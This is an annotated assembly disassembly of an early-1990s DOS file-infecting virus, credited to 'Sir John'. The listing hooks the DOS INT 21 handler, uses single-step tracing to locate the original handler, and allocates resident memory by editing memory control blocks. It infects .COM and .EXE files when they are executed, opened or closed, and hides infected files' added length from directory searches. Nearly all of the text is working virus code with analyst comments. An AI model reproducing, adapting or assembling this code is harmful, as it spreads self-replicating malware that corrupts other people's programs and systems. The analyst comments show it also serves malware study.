
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ									 ÛÛ
;ÛÛ				VIR_					 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛ	 Created:  ??-??-??						 ÛÛ
;ÛÛ	 Version:							 ÛÛ
;ÛÛ	 Code type: zero start						 ÛÛ
;ÛÛ	 Passes:    9	       Analysis Options on: A			 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛ	 Disassembled by: Sir John -- 11.MAR.1991			 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

PSP_0A		equ	0Ah			; (0000:000A=0)
MCB_0000	equ	0			; (7DBC:0000=E9)
MCB_0001	equ	1			; (7DBC:0001=275h)
MCB_0003	equ	3			; (7DBC:0003=1503h)
all_len 	equ	1600h
jmp_len 	equ	3
sav_file	equ	data_23 - virus_entry + jmp_len

seg_a		segment byte public
		assume	cs:seg_a, ds:seg_a

		org	0

		db	 00h

		jmp	vir_1
data_23 	dw	20CDh		; old file
data_24 	dw	0		; (first 6 bytes)
data_25 	dw	0		; - check sum
		db	0,0,0,0,0,0,0,0
data_27 	dw	0		; + 0eh = original SS:
data_28 	dw	0		; + 10h = original SP
		dw	0
data_29 	dd	0		; + 14h = .EXE file entry point
		db	0,0,0,0
data_31 	db	0		; flag : 1-EXE, 0-COM
data_32 	db	0FEh
		db	 3Ah
debug:		push	bp		;address is 0023
		mov	bp,sp
		push	ax
		cmp	[bp+4],0C000h
		jae	loc_1_1 	; segment > C000
		mov	ax,cs:data_68
		cmp	[bp+4],ax
		jna	loc_1_1
loc_1:		pop	ax
		pop	bp
		iret				; Interrupt return
loc_1_1:	cmp	byte ptr cs:data_73,1	; (CS:1250=0)
		je	loc_3			; Jump if equal
		mov	ax,[bp+4]
		mov	word ptr cs:old_INT+2,ax  ; (CS:122F=70h)
		mov	ax,[bp+2]
		mov	word ptr cs:old_INT,ax	  ; (CS:122D=0)
		jc	loc_2			; Jump if carry Set
		pop	ax
		pop	bp
		mov	ss,cs:data_92		; (CS:12DD=151Ch)
		mov	sp,cs:data_93		; (CS:12DF=0)
		mov	al,cs:data_97		; (CS:12E5=0)
		out	21h,al			; port 21h, 8259-1 int comands
		jmp	loc_79			; (0D40)
loc_2:
		and	word ptr [bp+6],0FEFFh
		mov	al,cs:data_97		; (CS:12E5=0)
		out	21h,al			; port 21h, 8259-1 int comands
		jmp	short loc_1		; (0037)
loc_3:
		dec	cs:data_74		; (CS:1251=0)
		jnz	loc_1			; Jump if not zero
		and	word ptr [bp+6],0FEFFh
		call	sub_21			; Save REGS in vir's stack
		call	sub_18			; (0DBA)
		lds	dx,cs:old_INT_1 	; (CS:1231=0) Load 32 bit ptr
		mov	al,1
		call	sub_27			; Set INT 01 vector
		call	sub_20			; Restore regs from vir's stack
		jmp	short loc_2		; (0067)


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		push	ds
		push	si
		xor	si,si			; Zero register
		mov	ds,si
		xor	ah,ah			; Zero register
		mov	si,ax
		shl	si,1			; Shift w/zeros fill
		shl	si,1			; Shift w/zeros fill
		mov	bx,[si]
		mov	es,[si+2]
		pop	si
		pop	ds
		retn
sub_1		endp

vir_1:		mov	cs:data_113,1600h	; (CS:135B=0)
		mov	cs:old_AX,ax		; (CS:12E3=0)
		mov	ah,30h
		int	21h			; DOS Services	ah=function 30h
						;  get DOS version number ax
		mov	cs:dos_ver,al		; (CS:12EE=0)
		mov	cs:old_DS,ds		; (CS:1245=7DBDh)
		mov	ah,52h
		int	21h			; DOS Services	ah=function 52h
						;  get DOS data table ptr es:bx
		mov	ax,es:[bx-2]
		mov	cs:data_68,ax		; (CS:1247=0)
		mov	es,ax
		mov	ax,es:[1]		; (5200:0001=0FFFFh)
		mov	cs:data_69,ax		; (CS:1249=0)
		push	cs
		pop	ds
		mov	al,1
		call	sub_1			; Get INT 01 vector
		mov	word ptr old_INT_1,bx	; (CS:1231=0)
		mov	word ptr old_INT_1+2,es ; (CS:1233=70h)
		mov	al,21h
		call	sub_1			; Get INT 21 vector
		mov	word ptr old_INT,bx	; (CS:122D=0)
		mov	word ptr old_INT+2,es	; (CS:122F=70h)
		mov	byte ptr data_73,0	; (CS:1250=0)
		mov	dx,offset debug
		mov	al,1
		call	sub_27			; Set INT 01 vector
		pushf				; Push flags
		pop	ax
		or	ax,100h
		push	ax
		in	al,21h			; port 21h, 8259-1 int IMR
		mov	data_97,al		; (CS:12E5)
		mov	al,0FFh
		out	21h,al			; port 21h, 8259-1 int comands
		popf				; Pop flags
		mov	ah,52h
		pushf				; Push flags
		call	dword ptr old_INT	; (CS:122D)
		pushf				; Push flags
		pop	ax
		and	ax,0FEFFh
		push	ax
		popf				; Pop flags
		mov	al,data_97		; (CS:12E5=0)
		out	21h,al			; port 21h, 8259-1 int comands
		push	ds
		lds	dx,old_INT_1		; (CS:1231=0) Load 32 bit ptr
		mov	al,1
		call	sub_27			; Set INT 01 vector
		pop	ds
		les	di,old_INT		; (CS:122D=0) Load 32 bit ptr
		mov	word ptr ptr_INT_21,di	 ; (CS:1235=0)
		mov	word ptr ptr_INT_21+2,es ; (CS:1237=70h)
		mov	byte ptr data_70,0EAh	; (CS:124B=0)
		mov	data_71,offset INT_21	; (CS:124C=0) (02CC)
		mov	data_72,cs		; (CS:124E=7DBDh)
		call	sub_18			; (0DBA)
		mov	ax,4B00h
		mov	data_95,ah		; (CS:12E2=0)
		mov	dx,offset data_32	; (CS:0021=0FEh)
		push	word ptr data_31	; (CS:0020=0FE00h)
		int	21h			; DOS Services	ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
		pop	word ptr data_31	; (CS:0020=0FE00h)
		add	word ptr es:[di-4],9
		nop
		mov	es,old_DS		; (CS:1245)
		mov	ds,old_DS		; (CS:1245)
		sub	word ptr ds:[2],161h	; decrement mem size
		mov	bp,word ptr ds:[2]	; mem size
		mov	dx,ds
		sub	bp,dx
		mov	ah,4Ah
		mov	bx,0FFFFh
		int	21h			; DOS Services	ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	ah,4Ah
		int	21h			; DOS Services	ah=function 4Ah
						;  change mem allocation, bx=siz
		dec	dx
		mov	ds,dx
		cmp	byte ptr ds:[MCB_0000],5Ah ; (7DBC:0000=0E9h) 'Z'
		je	loc_4			; Jump if equal
		dec	cs:data_95		; (CS:12E2=0)
loc_4:
		cmp	byte ptr cs:data_95,0	; (CS:12E2=0)
		je	loc_5			; Jump if equal
		mov	byte ptr ds:[MCB_0000],4Dh ; (7DBC:0000=0E9h) 'M'
loc_5:
		mov	ax,ds:MCB_0003		; (7DBC:0003=1503h)
		mov	bx,ax
		sub	ax,161h
		add	dx,ax
		mov	ds:MCB_0003,ax		; (7DBC:0003=1503h)
		inc	dx
		mov	es,dx
		mov	byte ptr es:MCB_0000,5Ah	; (915F:0000=0) 'Z'
		push	cs:data_69			; (CS:1249=0)
		pop	word ptr es:MCB_0001		; (915F:0001=0)
		mov	word ptr es:MCB_0003,160h	; (915F:0003=0)
		inc	dx
		mov	es,dx
		push	cs
		pop	ds
		mov	cx,all_len/2
		mov	si,all_len-2		; (CS:15FE=0)
		mov	di,si
		std				; Set direction flag
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		cld				; Clear direction
		push	es
		mov	ax,offset loc_1EE
		push	ax
		mov	es,cs:old_DS		; (CS:1245=7DBDh)
		mov	ah,4Ah			; 'J'
		mov	bx,bp
		int	21h			; DOS Services	ah=function 4Ah
						;  change mem allocation, bx=siz
		retf				; Return far - jump to loc_1EE
loc_1EE:	call	sub_18			; (0DBA)
		mov	cs:data_72,cs		; (CS:124E=7DBDh)
		call	sub_18			; (0DBA)
		push	cs
		pop	ds
		mov	byte ptr data_76,14h	; (CS:12A2=0)
		push	cs
		pop	es
		mov	di,offset data_75	; (CS:1252=0)
		mov	cx,14h
		xor	ax,ax			; Zero register
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
		mov	data_103,al		; (CS:12EF=0)
		mov	ax,old_DS		; (CS:1245=7DBDh)
		mov	es,ax
		lds	dx,es:[0Ah]		; from offset 000A in PSP Load 32 bit ptr
		mov	ds,ax
		add	ax,10h
		add	word ptr cs:data_29+2,ax ; (CS:001A=1ED5h)
		cmp	byte ptr cs:data_31,0	 ; (CS:0020=0)
		jne	loc_6			; Jump if not equal
; restore infected .COM file and run it
		sti				; Enable interrupts
		mov	ax,cs:data_23		; (CS:0004=20CDh)
		mov	word ptr ds:[100h],ax	; (CS:0100=0E9Ah)
		mov	ax,cs:data_24		; (CS:0006=340h)
		mov	word ptr ds:[102h],ax	; (CS:0102=589Ch)
		mov	ax,cs:data_25		; (CS:0008=50C6h)
		mov	word ptr ds:[104h],ax	; (CS:0104=0Dh)
		push	cs:old_DS		; (CS:1245=7DBDh)
		mov	ax,100h
		push	ax
		mov	ax,cs:old_AX		; (CS:12E3=0)
		retf				; Return far
loc_6:
; restore infected .EXE file and run it
		add	cs:data_27,ax		; (CS:0012=68Ch)
		mov	ax,cs:old_AX		; (CS:12E3=0)
		mov	ss,cs:data_27		; (CS:0012=68Ch)
		mov	sp,cs:data_28		; (CS:0014) original SP
		sti				; Enable interrupts
		jmp	cs:data_29		; (CS:0018=12Bh)
virus_entry:	cmp	sp,100h
		ja	loc_7			; Jump if above
		xor	sp,sp			; Zero register
loc_7:
		mov	bp,ax
		call	sub_2			; (0275)
sub_2:		pop	cx
		sub	cx,offset sub_2
		mov	ax,cs
		mov	bx,10h
		mul	bx			; dx:ax = ax * 10
		add	ax,cx			; cx = virus begin address
		adc	dx,0
		div	bx			; ax,dx rem=dx:ax/10
		push	ax			; ax = new segment
		mov	ax,offset vir_1
		push	ax
		mov	ax,bp
		retf				; Return far - jump to vir_1

table		db	 30h
		dw	offset _21_30
		db	 23h
		dw	offset _21_23
		db	 37h
		dw	offset _21_37
		db	 4bh
		dw	offset _21_4B
		db	 3ch
		dw	offset _21_3C
		db	 3dh
		dw	offset _21_3D
		db	 3Eh
		dw	offset _21_3E
		db	 0Fh
		dw	offset _21_0F
		db	 14h
		dw	offset _21_14
		db	 21h
		dw	offset _21_21
		db	 27h
		dw	offset _21_27
		db	 11h
		dw	offset _21_11_12
		db	 12h
		dw	offset _21_11_12
		db	 4Eh
		dw	offset _21_4E_4F
		db	 4Fh
		dw	offset _21_4E_4F
		db	 3Fh
		dw	offset _21_3F
		db	 40h
		dw	offset _21_40
		db	 42h
		dw	offset _21_42
		db	 57h
		dw	offset _21_57
		db	 48h
		dw	offset _21_48
end_tbl:
INT_21: 	cmp	ax,4b00h
		jnz	loc_8_1
		mov	cs:data_95,al
loc_8_1:	push	bp
		mov	bp,sp
		push	[bp+6]			; flags
		pop	cs:data_85
		pop	bp			;  ???
		push	bp			;  ???
		mov	bp,sp
		call	sub_21			; Save REGS in vir's stack
		call	sub_18			; xchg info in INT 21
		call	sub_15			; BREAK = OFF
		call	sub_20			; Restore regs from vir's stack
		call	sub_17			; Save REGS
		push	bx
		mov	bx,offset table
loc_8:
		cmp	ah,cs:[bx]
		jne	loc_9			; Jump if not equal
		mov	bx,cs:[bx+1]
		xchg	bx,[bp-14h]
		cld				; Clear direction
		retn
loc_9:
		add	bx,3
		cmp	bx,offset end_tbl
		jb	loc_8			; Jump if below
		pop	bx
loc_10:
		call	sub_16			; Restore BREAK state
		in	al,21h			; port 21h, 8259-1 int IMR
		mov	cs:data_97,al		; (CS:12E5=0)
		mov	al,0FFh
		out	21h,al			; port 21h, 8259-1 int comands
		mov	byte ptr cs:data_74,4	; (CS:1251=0)
		mov	byte ptr cs:data_73,1	; (CS:1250=0)
		call	sub_22			; Set INT 01 for debuging
		call	sub_19			; Restore REGS
		push	ax
		mov	ax,cs:data_85		; (CS:12B3=0)
		or	ax,100h
		push	ax
		popf				; Pop flags
		pop	ax
		pop	bp
		jmp	dword ptr cs:ptr_INT_21 ; (CS:1235=0)
loc_11:
		call	sub_21			; Save REGS in vir's stack
		call	sub_16			; (0D9B)
		call	sub_18			; (0DBA)
		call	sub_20			; Restore regs from vir's stack
		pop	bp
		push	bp
		mov	bp,sp
		push	cs:data_85		; (CS:12B3=0)
		pop	word ptr [bp+6]
		pop	bp
		iret				; Interrupt return
_21_11_12:	call	sub_19			; Restore REGS
		call	sub_24			; INT 21
		or	al,al			; Zero ?
		jnz	loc_11			; Jump if not zero
		call	sub_17			; Save REGS
		call	sub_3			; (0581)
		mov	al,0
		cmp	byte ptr [bx],0FFh
		jne	loc_12			; Jump if not equal
		mov	al,[bx+6]
		add	bx,7
loc_12:
		and	cs:data_104,al		; (CS:12F0=0)
		test	byte ptr [bx+1Ah],80h
		jz	loc_13			; Jump if zero
		sub	byte ptr [bx+1Ah],0C8h
		cmp	byte ptr cs:data_104,0	; (CS:12F0=0)
		jne	loc_13			; Jump if not equal
		sub	word ptr [bx+1Dh],1000h
		sbb	word ptr [bx+1Fh],0
loc_13:
		call	sub_19			; Restore REGS
		jmp	short loc_11		; (033F)
_21_0F: 	call	sub_19			; Restore REGS
		call	sub_24			; INT 21
		call	sub_17			; Save REGS
		or	al,al			; Zero ?
		jnz	loc_13			; Jump if not zero
		mov	bx,dx
		test	byte ptr [bx+15h],80h
		jz	loc_13			; Jump if zero
		sub	byte ptr [bx+15h],0C8h
		sub	word ptr [bx+10h],1000h
		sbb	byte ptr [bx+12h],0
		jmp	short loc_13		; (0396)
_21_27: 	jcxz	loc_15			; Jump if cx=0
_21_21: 	mov	bx,dx
		mov	si,[bx+21h]
		or	si,[bx+23h]
		jnz	loc_15			; Jump if not zero
		jmp	short loc_14		; (03D7)
_21_14: 	mov	bx,dx
		mov	ax,[bx+0Ch]
		or	al,[bx+20h]
		jnz	loc_15			; Jump if not zero
loc_14:
		call	sub_7			; (0919)
		jnc	loc_16			; Jump if carry=0
loc_15:
		jmp	loc_10			; (030F)
loc_16:
		call	sub_19			; Restore REGS
		call	sub_17			; Save REGS
		call	sub_24			; INT 21
		mov	[bp-4],ax
		mov	[bp-8],cx
		push	ds
		push	dx
		call	sub_3			; (0581)
		cmp	word ptr [bx+14h],1
		je	loc_17			; Jump if equal
		mov	ax,[bx]
		add	ax,[bx+2]
		add	ax,[bx+4]
		jz	loc_17			; Jump if zero
		add	sp,4
		jmp	short loc_13		; (0396)
loc_17:
		pop	dx
		pop	ds
		mov	si,dx
		push	cs
		pop	es
		mov	di,offset data_86	; (CS:12B5=0)
		mov	cx,25h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	di,offset data_86	; (CS:12B5=0)
		push	cs
		pop	ds
		mov	ax,[di+10h]
		mov	dx,[di+12h]
		add	ax,100Fh
		adc	dx,0
		and	ax,0FFF0h
		mov	[di+10h],ax
		mov	[di+12h],dx
		sub	ax,0FFCh
		sbb	dx,0
		mov	[di+21h],ax
		mov	[di+23h],dx
		mov	word ptr [di+0Eh],1
		mov	cx,1Ch
		mov	dx,di
		mov	ah,27h			; '''
		call	sub_24			; INT 21
		jmp	loc_13			; (0396)
_21_23: 	push	cs
		pop	es
		mov	si,dx
		mov	di,offset data_86	; (CS:12B5=0)
		mov	cx,25h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		push	ds
		push	dx
		push	cs
		pop	ds
		mov	dx,offset data_86	; CS:12B5
		mov	ah,0Fh
		call	sub_24			; INT 21
		mov	ah,10h
		call	sub_24			; INT 21
		test	byte ptr data_89,80h	; (CS:12CA=0)
		pop	si
		pop	ds
		jz	loc_20			; Jump if zero
		les	bx,cs:data_88		; (CS:12C5=0) Load 32 bit ptr
		mov	ax,es
		sub	bx,1000h
		sbb	ax,0
		xor	dx,dx			; Zero register
		mov	cx,cs:data_87		; (CS:12C3=0)
		dec	cx
		add	bx,cx
		adc	ax,0
		inc	cx
		div	cx			; ax,dx rem=dx:ax/reg
		mov	[si+23h],ax
		xchg	ax,dx
		xchg	ax,bx
		div	cx			; ax,dx rem=dx:ax/reg
		mov	[si+21h],ax
		jmp	loc_13			; (0396)
_21_4E_4F:	and	cs:data_85,0FFFEh	; (CS:12B3=0)
		call	sub_19			; Restore REGS
		call	sub_24			; INT 21
		call	sub_17			; Save REGS
		jnc	loc_18			; Jump if carry=0
		or	cs:data_85,1		; (CS:12B3=0)
		jmp	loc_13			; (0396)
loc_18:
		call	sub_3			; (0581)
		test	byte ptr [bx+19h],80h
		jnz	loc_19			; Jump if not zero
		jmp	loc_13			; (0396)
loc_19:
		sub	word ptr [bx+1Ah],1000h
		sbb	word ptr [bx+1Ch],0
		sub	byte ptr [bx+19h],0C8h
		jmp	loc_13			; (0396)
_21_3C: 	push	cx
		and	cx,7
		cmp	cx,7
		je	loc_23			; Jump if equal
		pop	cx
		call	sub_13			; (0CC6)
		call	sub_24			; INT 21
		call	sub_14			; (0D6C)
		pushf				; Push flags
		cmp	byte ptr cs:data_90,0	; (CS:12DA=0)
		je	loc_21			; Jump if equal
		popf				; Pop flags
loc_20:
		jmp	loc_10			; (030F)
loc_21:
		popf				; Pop flags
		jc	loc_22			; Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh			; '>'
		call	sub_24			; INT 21
		jmp	short _21_3D		; (0511)
loc_22:
		or	byte ptr cs:data_85,1	; (CS:12B3=0)
		mov	[bp-4],ax
		jmp	loc_13			; (0396)
loc_23:
		pop	cx
		jmp	loc_10			; (030F)
_21_3D:
		call	sub_9			; Get PSP segment
		call	sub_8			; (0925)
		jc	loc_26			; Jump if carry Set
		cmp	byte ptr cs:data_76,0	; (CS:12A2=0)
		je	loc_26			; Jump if equal
		call	sub_10			; (097E)
		cmp	bx,0FFFFh
		je	loc_26			; Jump if equal
		dec	cs:data_76		; (CS:12A2=0)
		push	cs
		pop	es
		mov	di,offset data_75	; (CS:1252=0)
		mov	cx,14h
		xor	ax,ax			; Zero register
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		mov	ax,cs:data_77		; (CS:12A3=0)
		mov	es:[di-2],ax
		mov	es:[di+26h],bx
		mov	[bp-4],bx
loc_25:
		and	byte ptr cs:data_85,0FEh	; (CS:12B3=0)
		jmp	loc_13			; (0396)
loc_26:
		jmp	loc_10			; (030F)
_21_3E: 	push	cs
		pop	es
		call	sub_9			; Get PSP segment
		mov	di,offset data_75	; (CS:1252=0)
		mov	cx,14h
		mov	ax,cs:data_77		; (CS:12A3=0)
loc_27:
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		jnz	loc_28			; Jump if not zero
		cmp	bx,es:[di+26h]
		jne	loc_27			; Jump if not equal
		mov	word ptr es:[di-2],0
		call	sub_4			; (0793) - infect file
		inc	cs:data_76		; (CS:12A2=0)
		jmp	short loc_25		; (0549)
loc_28:
		jmp	loc_10			; (030F)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		push	es
		mov	ah,2Fh			; '/'
		call	sub_24			; INT 21
		push	es
		pop	ds
		pop	es
		retn
sub_3		endp

_21_4B: 	or	al,al			; Zero ?
		jz	loc_29			; Jump if zero
		jmp	loc_36			; (06E0)
loc_29:
		push	ds
		push	dx
		mov	cs:prm_blck_adr,bx	; (CS:1224) save EXEC block offset
		mov	word ptr cs:prm_blck_adr+2,es ; (CS:1226) save EXEC block segment
		lds	si,dword ptr cs:prm_blck_adr  ; (CS:1224) Load EXEC block address
		mov	di,offset exec_block	 ; (CS:12F1)
		mov	cx,0Eh
		push	cs
		pop	es
		rep	movsb			; Save EXEC param block
		pop	si
		pop	ds
		mov	di,offset file_name	; (CS:1307)
		mov	cx,50h
		rep	movsb			; Save file name
		mov	bx,0FFFFh
		call	sub_23			; (0E3A)
		call	sub_19			; Restore REGS
		pop	bp
		pop	cs:data_98		; (CS:12E6=0)
		pop	cs:data_99		; (CS:12E8=0)
		pop	cs:data_85		; (CS:12B3=0)
		mov	ax,4B01h
		push	cs
		pop	es
		mov	bx,offset exec_block
		pushf				; Push flags
		call	dword ptr cs:ptr_INT_21 ; (CS:1235=0)
		jnc	loc_30			; Jump if carry=0
		or	cs:data_85,1		; (CS:12B3=0)
		push	cs:data_85		; (CS:12B3=0)
		push	cs:data_99		; (CS:12E8=0)
		push	cs:data_98		; (CS:12E6=0)
		push	bp
		mov	bp,sp
		les	bx,dword ptr cs:prm_blck_adr ; (CS:1224=0) Load 32 bit ptr
		jmp	loc_11			; (033F)
loc_30:
		call	sub_9			; Get PSP segment
		push	cs
		pop	es
		mov	di,offset data_75	; (CS:1252=0)
		mov	cx,14h
loc_31:
		mov	ax,cs:data_77		; (CS:12A3=0)
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		jnz	loc_32			; Jump if not zero
		mov	word ptr es:[di-2],0
		inc	cs:data_76		; (CS:12A2=0)
		jmp	short loc_31		; (060B)
loc_32:
		lds	si,cs:entry_point	; (CS:1303=0) Load 32 bit ptr
		cmp	si,1			; already infected?
		jne	loc_33			; Jump if not equal
		mov	dx,word ptr ds:data_29+2 ; (0000:001A) - original entry point segment
		add	dx,10h
		mov	ah,51h
		call	sub_24			; INT 21 - get PSP segment
		add	dx,bx
		mov	word ptr cs:entry_point+2,dx ; (CS:1305=0)
		push	word ptr ds:data_29	; (0000:0018) - original entry point offset
		pop	word ptr cs:entry_point ; (CS:1303=0)
		add	bx,10h
		add	bx,ds:data_27		; (0000:0012) - original SS:
		mov	cs:data_107,bx		; (CS:1301=0)
		push	word ptr ds:data_28	; (0000:0014) - original SP
		pop	cs:data_106		; (CS:12FF=0)
		jmp	short loc_34		; (067F)
loc_33:
		mov	ax,[si]
		add	ax,[si+2]
		add	ax,[si+4]
		jz	loc_35			; Jump if zero
		push	cs
		pop	ds
		mov	dx,offset file_name
		call	sub_8			; (0925)
		call	sub_10			; (097E)
		inc	cs:data_103		; (CS:12EF=0)
		call	sub_4			; infect file
		dec	cs:data_103		; (CS:12EF=0)
loc_34:
		mov	ah,51h
		call	sub_24			; INT 21
		call	sub_21			; Save REGS in vir's stack
		call	sub_16			; (0D9B)
		call	sub_18			; (0DBA)
		call	sub_20			; Restore REGS from vir's stack
		mov	ds,bx
		mov	es,bx
		push	cs:data_85		; (CS:12B3=0)
		push	cs:data_99		; (CS:12E8=0)
		push	cs:data_98		; (CS:12E6=0)
		pop	word ptr ds:PSP_0A	; offset 0A in PSP
		pop	word ptr ds:PSP_0A+2	; offset 0C in PSP
		push	ds
		lds	dx,dword ptr ds:PSP_0A	; offset 0A in PSP - terminate address
		mov	al,22h
		call	sub_27			; Set INT 22 vector
		pop	ds
		popf				; Pop flags
		pop	ax
		mov	ss,cs:data_107		; (CS:1301=0)
		mov	sp,cs:data_106		; (CS:12FF=0)
		jmp	dword ptr cs:entry_point ; (CS:1303=0)
loc_35:
		mov	bx,[si+1]
		mov	ax,ds:[bx+si+sav_file]	 ; (0000:FD9F)
		mov	[si],ax
		mov	ax,ds:[bx+si+sav_file+2] ; (0000:FDA1)
		mov	[si+2],ax
		mov	ax,ds:[bx+si+sav_file+4] ; (0000:FDA3)
		mov	[si+4],ax
		jmp	short loc_34		; (067F)
loc_36:
		cmp	al,1
		je	loc_37			; Jump if equal
		jmp	loc_10			; (030F)
loc_37:
		or	cs:data_85,1		; (CS:12B3=0)
		mov	cs:prm_blck_adr,bx	; (CS:1224=0)
		mov	word ptr cs:prm_blck_adr+2,es ; (CS:1226=7DBDh)
		call	sub_19			; Restore REGS
		call	sub_24			; INT 21
		call	sub_17			; Save REGS
		les	bx,dword ptr cs:prm_blck_adr	; (CS:1224) Load EXEC param block address
		lds	si,dword ptr es:[bx+12h]	; Load CS:IP from EXEC parameter block
		jc	loc_40				; Jump if carry Set
		and	byte ptr cs:data_85,0FEh	; (CS:12B3=0)
		cmp	si,1			; infected .EXE ?
		je	loc_38			; Jump if equal
		mov	ax,[si]
		add	ax,[si+2]
		add	ax,[si+4]
		jnz	loc_39			; Jump if not zero
		mov	bx,[si+1]
		mov	ax,ds:[bx+si+sav_file]	; (013B:FD9F) saved original file
		mov	[si],ax
		mov	ax,ds:[bx+si+sav_file+2] ; (013B:FDA1) saved original file
		mov	[si+2],ax
		mov	ax,ds:[bx+si+sav_file+4] ; (013B:FDA3) saved original file
		mov	[si+4],ax
		jmp	short loc_39		; (0765)
loc_38:
		mov	dx,word ptr ds:data_29+2	; (013B:001A=2E09h)
		call	sub_9			; Get PSP segment
		mov	cx,cs:data_77		; (CS:12A3) - PSP segment
		add	cx,10h
		add	dx,cx
		mov	es:[bx+14h],dx
		mov	ax,word ptr ds:data_29	; (013B:0018=7332h)
		mov	es:[bx+12h],ax
		mov	ax,ds:data_27		; (013B:0012=2E08h)
		add	ax,cx
		mov	es:[bx+10h],ax
		mov	ax,ds:data_28		; (013B:0014=3E80h)
		mov	es:[bx+0Eh],ax
loc_39:
		call	sub_9			; Get PSP segment
		mov	ds,cs:data_77		; (CS:12A3=0)
		mov	ax,[bp+2]
		mov	ds:PSP_0A,ax		; (0000:000A=0F000h)
		mov	ax,[bp+4]
		mov	word ptr ds:PSP_0A+2,ax ; (0000:000C=7F6h)
loc_40:
		jmp	loc_13			; (0396)
_21_30: 	mov	byte ptr cs:data_104,0	; (CS:12F0=0)
		mov	ah,2Ah
		call	sub_24			; INT 21
		cmp	dx,916h
		jb	loc_41			; Jump if below
		call	sub_28			; (0FB2)
loc_41:
		jmp	loc_10			; (030F)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;		     SUBROUTINE - INFECTION
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		call	sub_13			; (0CC6)
		call	sub_5			; (0855)
		mov	byte ptr data_31,1	; (CS:0020=0)
		cmp	data_38,5A4Dh		; (CS:1200=0)
		je	loc_42			; Jump if equal
		cmp	data_38,4D5Ah		; (CS:1200=0)
		je	loc_42			; Jump if equal
		dec	byte ptr data_31	; (CS:0020=0)
		jz	loc_45			; Jump if zero
loc_42:
; .EXE file infect
		mov	ax,data_41		; (CS:1204=0)
		shl	cx,1			; Shift w/zeros fill
		mul	cx			; dx:ax = reg * ax
		add	ax,200h
		cmp	ax,si
		jb	loc_44			; Jump if below
		mov	ax,data_43		; (CS:120A=0)
		or	ax,data_44		; (CS:120C=0)
		jz	loc_44			; Jump if zero
		mov	ax,data_80		; (CS:12A9=0)
		mov	dx,data_81		; (CS:12AB=0)
		mov	cx,200h
		div	cx			; ax,dx rem=dx:ax/reg
		or	dx,dx			; Zero ?
		jz	loc_43			; Jump if zero
		inc	ax
loc_43:
		mov	data_41,ax		; (CS:1204=0)
		mov	data_40,dx		; (CS:1202=0)
		cmp	data_48,1		; (CS:1214=0)
		je	loc_46			; Jump if equal
		mov	data_48,1		; (CS:1214=0)
		mov	ax,si
		sub	ax,data_42		; (CS:1208=0)
		mov	data_49,ax		; (CS:1216=0)
		add	data_41,8		; (CS:1204=0)
		mov	data_45,ax		; (CS:120E=0)
		mov	data_46,1000h		; (CS:1210=0) BUG BUG BUG!!!
						; When .EXE file is infected,
						; the end of the virus wil be
						; damaged. (sp = 1000)
		call	sub_6			; (08B3)
loc_44:
		jmp	short loc_46		; (084C)
loc_45:
; .COM file infect
		cmp	si,0F00h		; file len in paragraphs
		jae	loc_46			; Jump if above or =
		mov	ax,data_38		; (CS:1200=0)
		mov	data_23,ax		; (CS:0004=20CDh)
		add	dx,ax
		mov	ax,data_40		; (CS:1202=0)
		mov	data_24,ax		; (CS:0006=340h)
		add	dx,ax
		mov	ax,data_41		; (CS:1204=0)
		mov	data_25,ax		; (CS:0008=50C6h)
		add	dx,ax
		jz	loc_46			; Jump if zero - allready infected
		mov	cl,0E9h
		mov	byte ptr data_38,cl	; (CS:1200=0)
		mov	ax,10h
		mul	si			; dx:ax = reg * ax
		add	ax,265h
		mov	word ptr data_38+1,ax	; (CS:1201=0)
		mov	ax,data_38		; (CS:1200=0)
		add	ax,data_40		; (CS:1202=0)
		neg	ax
		mov	data_41,ax		; (CS:1204=0)
		call	sub_6			; (08B3)
loc_46:
		mov	ah,3Eh			; '>'
		call	sub_24			; INT 21
		call	sub_14			; (0D6C)
		retn
